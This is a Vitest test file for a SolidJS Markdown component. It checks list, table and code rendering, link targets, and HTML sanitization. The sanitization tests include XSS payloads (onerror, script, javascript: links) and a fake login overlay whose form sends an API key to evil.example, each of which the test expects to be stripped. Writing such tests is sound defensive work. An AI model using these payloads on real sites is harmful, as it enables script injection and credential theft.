import { render, screen } from "@solidjs/testing-library";
import { afterEach, describe, expect, it } from "vitest";

import { Markdown } from "./Markdown";

describe("Markdown", () => {
  afterEach(() => document.body.replaceChildren());

  it("renders GitHub-compatible Markdown structure", () => {
    const view = render(() => <Markdown source={["- first", "- second", "", "1. one", "2. two", "", "```text", "value", "```", "", "| key | value |", "| --- | --- |", "| a | b |"].join("\n")} />);
    const root = view.container.querySelector(".markdown-body");

    expect(root?.classList.contains("markdown")).toBe(true);
    expect(root?.querySelectorAll("ul > li")).toHaveLength(2);
    expect(root?.querySelectorAll("ol > li")).toHaveLength(2);
    expect(root?.querySelector("pre code.language-text")?.textContent).toContain("value");
    expect(root?.querySelectorAll("table tbody tr")).toHaveLength(1);
  });

  it("sanitizes unsafe HTML", () => {
    const view = render(() => <Markdown source={'<img src="x" onerror="alert(1)"><script>alert(2)</script><a href="javascript:alert(3)">unsafe</a>'} />);
    const root = view.container.querySelector(".markdown-body");

    expect(root?.querySelector("script")).toBeNull();
    expect(root?.querySelector("img")?.hasAttribute("onerror")).toBe(false);
    expect(root?.querySelector("a")?.hasAttribute("href")).toBe(false);
    expect(screen.getByText("unsafe")).toBeTruthy();
  });

  it("opens external links in a new tab without exposing the opener", () => {
    const view = render(() => <Markdown source={"[docs](https://example.test/docs) and [local](/api/issues)"} />);
    const [external, local] = Array.from(view.container.querySelectorAll("a"));
    expect(external?.getAttribute("target")).toBe("_blank");
    expect(external?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(local?.getAttribute("target")).toBeNull();
  });

  it("opens protocol-relative and mixed-case external links in a new tab", () => {
    const view = render(() => <Markdown source={"[a](//evil.example/x) [b](HTTPS://evil.example/y)"} />);
    for (const link of Array.from(view.container.querySelectorAll("a"))) {
      expect(link.getAttribute("target")).toBe("_blank");
      expect(link.getAttribute("rel")).toBe("noopener noreferrer");
    }
  });

  it("strips markup that could spoof application UI or collect credentials", () => {
    const payload =
      '<div style="position:fixed;inset:0;z-index:99999;background:#fff"><h2>Session expired</h2><form action="https://evil.example/collect"><label>API Key <input type="password" name="key"></label><button type="submit">Sign in</button></form></div>';
    const view = render(() => <Markdown source={payload} />);
    const root = view.container.querySelector(".markdown-body")!;
    expect(root.querySelector("form")).toBeNull();
    expect(root.querySelector("input")).toBeNull();
    expect(root.querySelector("button")).toBeNull();
    expect(root.querySelector("[style]")).toBeNull();
    expect(screen.getByText("Session expired")).toBeTruthy();
    // Named props would otherwise let content shadow modal aria-labelledby ids.
    expect(root.querySelector('[id^="cl-"]')).toBeNull();
  });
});
